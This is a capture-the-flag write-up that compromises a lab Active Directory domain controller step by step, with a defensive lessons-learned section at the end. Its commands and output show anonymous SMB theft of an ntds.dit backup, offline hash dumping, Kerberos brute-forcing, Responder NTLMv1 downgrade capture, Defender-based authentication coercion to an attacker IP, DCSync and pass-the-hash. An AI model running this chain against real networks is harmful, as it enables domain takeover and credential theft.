# HTB Write-up: APT

**Difficulty:** Hard
**OS:** Windows (Active Directory Domain Controller)
**Target IP:** 10.129.96.60
**Attacker IP:** 10.10.15.146
**Domain:** htb.local

---

## 1. Reconnaissance

### 1.1 Initial Port Scan (IPv4)

```bash
rustscan -a 10.129.96.60
```

```
Open 10.129.96.60:80
Open 10.129.96.60:135
```

```bash
nmap -sCV -T4 10.129.96.60 -p80,135 -oA nmap/nmap
```

```
PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Over IPv4, only two ports were visible: a website ("Gigantic Hosting") and MSRPC (port 135). This is a suspiciously small footprint for what turned out to be a full Domain Controller — a strong hint that most of the interesting services are firewalled off from the IPv4 interface, or only reachable through a different network path (in this case, IPv6).

### 1.2 Using IOXIDResolver to Discover an IPv6 Address

Because port 135 (MSRPC / the RPC Endpoint Mapper) was open, I used **IOXIDResolver**, a tool that abuses the **MS-RPC OXID Resolution** mechanism (part of DCOM) to enumerate every network interface the target machine knows about — including interfaces that aren't reachable or advertised on the scanned network path. This works because DCOM's OXID resolver service will happily report back *all* bound interface addresses (IPv4, IPv6, even internal-only ones) when queried, regardless of which interface the query arrived on.

```bash
git clone https://github.com/mubix/IOXIDResolver.git
python3 IOXIDResolver.py -t 10.129.96.60
```

```
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::7142:636f:459d:3508
Address: dead:beef::b885:d62a:d679:573f
```

This confirmed the box also has a **ULA IPv6 address** (`dead:beef::/64` range — HTB's standard "internal" IPv6 addressing for these labs) and a hostname of `apt`. Added `apt` to `/etc/hosts` pointing at the discovered address to enable name resolution for later Kerberos-dependent tooling.

### 1.3 Full IPv6 Port Scan

```bash
rustscan -a apt -- -6 -sV -sC -oA nmap/nmap6
```

```
Open [dead:beef::9dba:f478:ee3d:7c9b]:53
Open [dead:beef::9dba:f478:ee3d:7c9b]:80
Open [dead:beef::9dba:f478:ee3d:7c9b]:88
Open [dead:beef::9dba:f478:ee3d:7c9b]:135
Open [dead:beef::9dba:f478:ee3d:7c9b]:389
Open [dead:beef::9dba:f478:ee3d:7c9b]:445
Open [dead:beef::9dba:f478:ee3d:7c9b]:464
Open [dead:beef::9dba:f478:ee3d:7c9b]:593
Open [dead:beef::9dba:f478:ee3d:7c9b]:636
Open [dead:beef::9dba:f478:ee3d:7c9b]:3268
Open [dead:beef::9dba:f478:ee3d:7c9b]:3269
Open [dead:beef::9dba:f478:ee3d:7c9b]:5985
Open [dead:beef::9dba:f478:ee3d:7c9b]:9389
...(high ephemeral RPC ports)
```

```bash
nmap -6 -Pn -sV -p 53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 apt
```

```
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
135/tcp  open  msrpc             Microsoft Windows RPC
389/tcp  open  ldap
445/tcp  open  microsoft-ds      Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf            .NET Message Framing
```

This service list (53, 88, 389, 445, 464, 3268, 5985, 9389) is the textbook signature of a **Windows Active Directory Domain Controller**: DNS, Kerberos, LDAP/LDAPS, the Global Catalog, and WinRM for remote management. The real target was hiding behind IPv6 the whole time.

---

## 2. SMB Enumeration — Anonymous Access

### 2.1 Listing Shares

```bash
smbclient -L //apt/ -N
```

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
```

**Anonymous/null-session SMB access was permitted**, and alongside the standard AD shares (`NETLOGON`, `SYSVOL`) there's a non-default share named **`backup`** — immediately worth investigating.

### 2.2 Retrieving the Backup

```bash
smbclient //apt/backup -N -c "get backup.zip" -t 300
```

```
Anonymous login successful
getting file \backup.zip of size 10650961 as backup.zip (98.8 KiloBytes/sec) (average 98.8 KiloBytes/sec)
```

Downloaded a ~10 MB `backup.zip`, anonymously, with no authentication required.

---

## 3. Extracting the Domain's Password Database

### 3.1 The Zip Is Password Protected

```bash
unzip backup.zip
```

```
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password:
```

The archive contains a folder literally named **`Active Directory/`** — containing `ntds.dit`, which is the actual **Active Directory database file** on a Domain Controller. `ntds.dit` holds every domain object (users, computers, groups) along with each account's password hash. If this file — plus the `SYSTEM` registry hive needed to decrypt it — can be extracted, the entire domain's credentials can be dumped **offline**, without ever touching the live DC's authentication stack.

### 3.2 Cracking the Zip Password

```bash
zip2john backup.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE
```

The zip's password — `iloveyousomuch` — cracked instantly against `rockyou.txt`, confirming a weak, dictionary-guessable password was used to "protect" what is effectively a full domain compromise kit.

```bash
unzip backup.zip
```

```
  inflating: Active Directory/ntds.dit
  inflating: Active Directory/ntds.jfm
   creating: registry/
  inflating: registry/SECURITY
  inflating: registry/SYSTEM
```

This confirmed the backup contains everything needed for a full offline credential dump:
- **`ntds.dit`** — the AD database (encrypted, per-object, using a key derived from the boot key)
- **`SYSTEM`** registry hive — contains the **boot key**, required to decrypt the encrypted secrets inside `ntds.dit` and `SECURITY`
- **`SECURITY`** registry hive — contains LSA secrets (cached credentials, service account passwords, etc.)

### 3.3 Offline Dump with secretsdump.py

```bash
secretsdump.py local -system registry/SYSTEM -security registry/SECURITY -ntds "Active Directory/ntds.dit" -outputfile hashes
```

```
[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
HTB\APT$:aes256-cts-hmac-sha1-96:d5063cca2e42ccf7be4fe802d6d231aebd279a19e45733cabc173d4235ed432b
HTB\APT$:aes128-cts-hmac-sha1-96:cca6a15aed61bc9d6e3add512f1f377b
HTB\APT$:des-cbc-md5:07d05b1a1a34d63d
HTB\APT$:plain_password_hex:34005b...(long hex-encoded value)
HTB\APT$:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
[*] DefaultPassword
(Unknown User):Password123!
[*] DPAPI_SYSTEM
dpapi_machinekey:0x3e0d78cb8f3ed66196584c44b5701501789fc102
dpapi_userkey:0xdcde3fc585c430a72221a48691fb202218248d46
[*] NL$KM
 (Really long output)
```

Impacket's `secretsdump.py` reconstructs the AD encryption chain locally (boot key from `SYSTEM` → decrypts LSA secrets in `SECURITY` and the per-account keys in `ntds.dit`), yielding, among other things:
- The **DC's own machine account** (`APT$`) Kerberos keys, NT hash, and even a decodable plaintext (`plain_password_hex`) — machine accounts have long random passwords, so the plaintext itself isn't directly useful, but the hash material is gold for later attacks.
- Every domain user's NTLM hash, stored elsewhere in the full `hashes.ntds` output (truncated above for brevity), which becomes the basis for the next stage.

---

## 4. Domain User Enumeration

### 4.1 Building a Username List from the Dump

```bash
cut -d ':' -f 1 hashes.ntds.kerberos > usernames.txt
sort -u usernames.txt > users.txt
```

The Kerberos-key-format output file naturally includes every account name, giving a ready-made username list without needing separate LDAP/RID-cycling enumeration.

### 4.2 Validating Usernames via Kerberos

```bash
kerbrute userenum -d htb.local --dc apt users.txt
```

```
2026/08/07 04:45:35 >  [+] VALID USERNAME:       Administrator@htb.local
2026/08/07 04:46:43 >  [+] VALID USERNAME:       APT$@htb.local
2026/08/07 04:53:26 >  [+] VALID USERNAME:       henry.vinson@htb.local
```

`kerbrute` confirms valid accounts by abusing a quirk of Kerberos pre-authentication (AS-REQ): the KDC responds differently for a valid vs. invalid username, even without knowing the password, letting an attacker enumerate real accounts with zero authentication and (in default configurations) without generating a Windows logon-failure event. This confirmed a real human account: **`henry.vinson`**.

### 4.3 Cracking henry.vinson's Password via Kerberos Pre-Auth Brute-Force

The offline NTDS dump gave hashes for machine/service accounts, but not directly a usable one for `henry.vinson`. Rather than trying every extracted hash against every service, I isolated the NT hash column and brute-forced Kerberos pre-authentication directly for the target user:

```bash
cut -d ':' -f 4 hashes.ntds > hashes.txt
```

Using **pyKerbrute** (https://github.com/3gstudent/pyKerbrute), which brute-forces Kerberos **AS-REQ** pre-authentication: for each guess, it derives an RC4 (NTLM-equivalent) key from the candidate, encrypts a Kerberos pre-auth timestamp with it, and sends an AS-REQ to the KDC. A `KRB_AP_ERR_SKEW`/successful response (rather than `KRB5KDC_ERR_PREAUTH_FAILED`) confirms the guess was correct — critically, this works directly against **NTLM hashes**, not just plaintext password guesses, since Kerberos RC4 pre-auth keys are cryptographically equivalent to the NTLM hash.

This recovered a working NT hash for `henry.vinson`:

```bash
nxc smb apt -d htb.local -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb
```

```
SMB    dead:beef::b885:d62a:d679:573f 445    APT    [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB    dead:beef::b885:d62a:d679:573f 445    APT    [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
```

`netexec` (`nxc`) confirmed the hash authenticates successfully against SMB — but `henry.vinson` doesn't have WinRM/remote-management rights, so **Evil-WinRM still failed** with this account despite valid credentials.

---

## 5. Pivoting to a Privileged Account via the Registry

### 5.1 Using impacket-reg for Remote Registry Access

Since `henry.vinson` has valid domain credentials but no interactive shell access, I used **`reg.py`** (Impacket) to remotely query the registry over SMB — this uses the account's existing (non-admin, but valid) SMB session to talk to the Remote Registry service, which can expose useful configuration/credential data stored by applications without needing a full shell.

```bash
reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU
```

```
HKU
HKU\.DEFAULT
HKU\S-1-5-19
HKU\S-1-5-20
HKU\S-1-5-21-2993095098-2100462451-206186470-1105
HKU\S-1-5-21-2993095098-2100462451-206186470-1105_Classes
HKU\S-1-5-18
```

`HKU\S-1-5-21-...-1105` is a loaded per-user profile hive (i.e., a real, currently-loaded user SID under this domain) — worth drilling into.

```bash
reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName 'HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software'
```

```
HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem
HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\Microsoft
HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\Policies
...
```

**`GiganticHostingManagementSystem`** immediately stands out — it matches the branding of the website found in the initial recon ("Gigantic Hosting"). Custom line-of-business applications frequently (and insecurely) store their own configuration — including credentials — directly under `HKCU\Software\<AppName>`.

### 5.2 Credentials in Plaintext

```bash
reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName 'HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem'
```

```
HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
```

The application stored an **administrative-tier account's credentials in plaintext** directly in the registry: `henry.vinson_adm` / `G1#Ny5@2dvht` — a separate, privileged "admin" counterpart to the standard `henry.vinson` account (a common AD pattern: a `_adm` suffixed account for elevated tasks).

---

## 6. Foothold

### 6.1 WinRM Access

```bash
evil-winrm -u henry.vinson_adm -i apt -p 'G1#Ny5@2dvht'
```

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents>
```

Unlike the base `henry.vinson` account, `henry.vinson_adm` has rights to establish a WinRM session — ✅ **foothold obtained.**

### 6.2 User Flag

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\desktop> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         8/8/2026   7:08 PM             34 user.txt
```

### 6.3 Manual Enumeration

Ran a recursive directory listing of the user's profile to look for anything unusual:

```powershell
cmd.exe /c dir /S /A
```

Nothing immediately exploitable turned up in the filesystem walk itself, but it prompted a closer look at the account's own activity — specifically, its PowerShell command history.

---

## 7. Privilege Escalation

### 7.1 PowerShell History Reveals a Security Downgrade

```powershell
cat C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
```

This is a critical finding: at some point, `henry.vinson_adm` ran a PowerShell command **as the domain Administrator** (via `Invoke-Command -Credential`) that modified the machine's `LmCompatibilityLevel` registry value.

**What `LmCompatibilityLevel` controls:** this LSA registry setting governs which authentication protocol versions (LM, NTLMv1, NTLMv2) a Windows host will send and accept for network authentication. Per Microsoft's own documentation (cross-checked against https://ss64.com/nt/syntax-ntlm.html), setting this value to **2** configures the *client* to send only NTLM (no legacy LM) responses, while still permitting the **domain controller to accept incoming LM and NTLMv1 authentication** from other hosts. In other words: this specific value doesn't harden the DC — it actually keeps the door open for the weakest, most crackable authentication protocol (NTLMv1) to still be accepted domain-wide.

This is significant because **NTLMv1** is vulnerable to relatively practical offline cracking (via known-plaintext/DES weaknesses in the protocol), unlike NTLMv2, whose hashes are far more resistant. This single misconfigured registry value effectively reopens a legacy, crackable authentication downgrade path.

### 7.2 Preparing to Capture and Crack an NTLMv1 Hash

Knowing NTLMv1 was still accepted, the plan was to:
1. Force the DC to authenticate to an attacker-controlled listener (coercing outbound SMB authentication).
2. Capture the resulting NTLMv1 challenge/response with **Responder**.
3. Crack it using a specialized rainbow-table-style cracking service, since NTLMv1's use of DES makes it crackable via a known technique (splitting the 16-byte NT hash across two independent 7-byte DES keyspaces, each of which is small enough to brute-force/precompute).

Consulted https://crack.sh/netntlm/, which documents this exact NTLMv1 weakness and offers a free cracking service (built on precomputed DES rainbow tables) — but notes a critical caveat: NTLMv1 responses are normally *randomly salted per session*, making precomputation useless, **unless** the challenge sent by the attacker is fixed to a known "magic" value (`1122334455667788`). Responder supports forcing this fixed challenge specifically to make captured hashes crackable this way.

### 7.3 Setting Up Responder

```bash
responder -I tun0 --lm
```

```
[+] Poisoning Options:
    Force LM downgrade         [ON]
    Force ESS downgrade        [ON]
[+] Generic Options:
    Challenge set              [1122334455667788]
```

The `--lm` flag forces Responder to attempt downgrading incoming NTLM authentication to weaker LM/NTLMv1, and Responder always uses the fixed `1122334455667788` challenge — which, combined with the `LmCompatibilityLevel=2` misconfiguration found in the PowerShell history, meant an authenticating machine would send a **crackable NTLMv1 response**.

### 7.4 Forcing the DC to Authenticate to Responder

To trigger outbound SMB authentication from the target back to my listener, I abused **Windows Defender's on-demand scan feature**, pointing it at a UNC path on my attacker machine. When Defender scans a remote/UNC file path, the underlying OS must first authenticate to that SMB share to read the file — providing a reliable, built-in way to coerce outbound authentication without needing a dedicated coercion exploit (like PetitPotam).

```powershell
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File \\10.10.15.146\share\file.txt
```

```
Scan starting...
```

This immediately triggered inbound authentication on the Responder listener:

```
[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
```

The authentication came in as the **domain controller's own machine account, `APT$`** — the underlying system process performing the file scan authenticates as the local computer account, not the interactively logged-on user.

### 7.5 Cracking the NTLMv1 Hash

Following crack.sh's documented format, submitted the DES-derived hash halves:

```
NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
```

Result: **`d167c3238864b12f5f82feae86a7f798`** — the recovered **NT hash for the `APT$` machine account**.

### 7.6 DCSync via the Machine Account Hash

A Domain Controller's own machine account inherently holds the **Replicating Directory Changes** (and **Replicating Directory Changes All**) extended rights on the domain — the same permissions used for legitimate AD replication between domain controllers. This means possessing valid credentials (or an NT hash, for pass-the-hash) for a DC's machine account is sufficient to perform a **DCSync** attack: impersonating a replication partner to request any account's secrets directly from AD, without ever touching a shell on the DC itself.

```bash
secretsdump.py 'htb.local/APT$@apt' -hashes :d167c3238864b12f5f82feae86a7f798 -just-dc-user administrator
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
```

`secretsdump.py`'s `-just-dc-user` flag performs a targeted DCSync — using the `APT$` machine account's hash to authenticate over DRSUAPI (the AD replication RPC interface) and pull just the **`Administrator`** account's NT hash and Kerberos keys directly from the live domain, without ever needing an interactive session on the DC.

### 7.7 Full Compromise

```bash
evil-winrm -u administrator -i apt -H c370bddf384a691d811ff3495e8a72e2
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

✅ **Domain Administrator access obtained** via pass-the-hash.

---

## 8. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan`/`nmap` showed almost nothing over IPv4; **IOXIDResolver** abused MS-RPC OXID resolution (DCOM) to leak the box's IPv6 address, revealing it as a full Domain Controller |
| Initial Access | Anonymous/null SMB session listed a non-default `backup` share containing `backup.zip` — a full offline AD backup (`ntds.dit` + `SYSTEM`/`SECURITY` hives) |
| Credential Extraction | Cracked the zip's weak password (`iloveyousomuch`) with John/rockyou; `secretsdump.py` performed a full **offline NTDS dump**, yielding the DC's `APT$` machine-account keys and every domain user's hash material |
| User Enumeration | Built a username list from the dump; `kerbrute` confirmed valid accounts via Kerberos pre-auth username enumeration, surfacing `henry.vinson` |
| Credential Recovery | `pyKerbrute` brute-forced Kerberos AS-REQ pre-authentication using candidate NT hashes, recovering a working hash for `henry.vinson` |
| Privilege Discovery | `henry.vinson`'s hash had SMB access but no WinRM rights; `reg.py` (remote registry) found a custom app (`GiganticHostingManagementSystem`) storing a privileged `henry.vinson_adm` account's password in **plaintext** in `HKU` |
| Foothold | Evil-WinRM as `henry.vinson_adm` → retrieved `user.txt` |
| Privilege Escalation | PowerShell history revealed `LmCompatibilityLevel` had been downgraded to `2`, still permitting weak NTLMv1 authentication domain-wide; forced the DC (`APT$`) to authenticate to a Responder listener via a Windows Defender UNC scan coercion, capturing a crackable NTLMv1 hash, cracked via crack.sh's DES rainbow-table service |
| Domain Compromise | Used the cracked `APT$` machine-account hash to perform a targeted **DCSync** (`secretsdump.py -just-dc-user`), extracting the domain `Administrator`'s NT hash, then authenticated via pass-the-hash over WinRM |

**Root cause / lessons learned:**
- **Anonymous SMB access** should never be permitted on a Domain Controller (or any server), and shares should never contain full AD backups (`ntds.dit`) reachable without strong authentication — this single misconfiguration was the root of the entire chain.
- Backup archives protecting domain secrets need strong, unique passwords; a dictionary-crackable password (`iloveyousomuch`) provided zero real protection for the crown jewels of the domain.
- Third-party/custom line-of-business applications must never store credentials — especially privileged ones — in plaintext in the registry or any other unencrypted location; use a proper credential vault (e.g., Windows Credential Manager with DPAPI, or a secrets manager) instead.
- `LmCompatibilityLevel` should be set to its most restrictive value (**5** — "Send NTLMv2 response only, refuse LM & NTLM") domain-wide via Group Policy; a value of `2` still leaves the door open to NTLMv1 downgrade/relay/cracking attacks, as demonstrated here.
- Authentication-coercion techniques (whether via Defender's `MpCmdRun.exe`, PetitPotam, PrinterBug, or similar) mean any mechanism that causes a machine account to authenticate to an attacker-controlled listener is dangerous once combined with a legacy protocol downgrade — SMB signing enforcement and blocking outbound NTLM authentication to untrusted hosts (or requiring Kerberos-only authentication) would have prevented this from being exploitable.
- The `APT$` machine account's DCSync-capable replication rights are inherent to being a DC — the real fix is ensuring machine-account credential material (and any hash derived from it) can never be captured or cracked in the first place, which loops back to disabling legacy authentication protocols.

---

## 9. Tools Used

- `rustscan`, `nmap` — reconnaissance (IPv4 and IPv6)
- **IOXIDResolver** — MS-RPC/DCOM OXID resolution to leak IPv6 interfaces
- `smbclient` — anonymous SMB enumeration and file retrieval
- `zip2john` + `john` (rockyou.txt) — zip password cracking
- `secretsdump.py` (Impacket) — offline NTDS.DIT dump and, later, DCSync
- `kerbrute` — Kerberos-based username enumeration
- `pyKerbrute` — Kerberos AS-REQ pre-authentication hash brute-forcing
- `reg.py` (Impacket) — remote registry querying
- `evil-winrm` — WinRM shell access (password and pass-the-hash)
- **Responder** — LLMNR/NBT-NS poisoning and NTLM hash capture (`--lm` downgrade mode)
- `MpCmdRun.exe` (Windows Defender) — authentication coercion via UNC path scanning
- **crack.sh** — DES-based NTLMv1 hash cracking service
- `netexec` (`nxc`) — credential/hash validation against SMB
